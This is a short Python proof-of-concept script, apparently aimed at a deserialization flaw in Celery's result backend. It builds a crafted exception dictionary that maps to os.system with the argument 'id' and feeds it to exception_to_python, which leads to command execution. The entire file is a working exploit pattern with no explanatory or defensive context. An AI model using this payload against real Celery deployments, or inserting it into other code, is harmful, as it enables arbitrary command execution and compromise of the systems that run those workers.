from celery import Celery

app = Celery('tasks', broker='pyamqp://guest@localhost//')

@app.task
def example_task():
    return "This is a task."

malicious_data = {
    'result': 'malicious_command',
    'exc_module': 'os',
    'exc_type': 'system',
    'exc_message': 'id'
}

try:
    result = app.backend.exception_to_python(malicious_data)
    print(result)
except Exception as e:
    print("Caught an error:", e)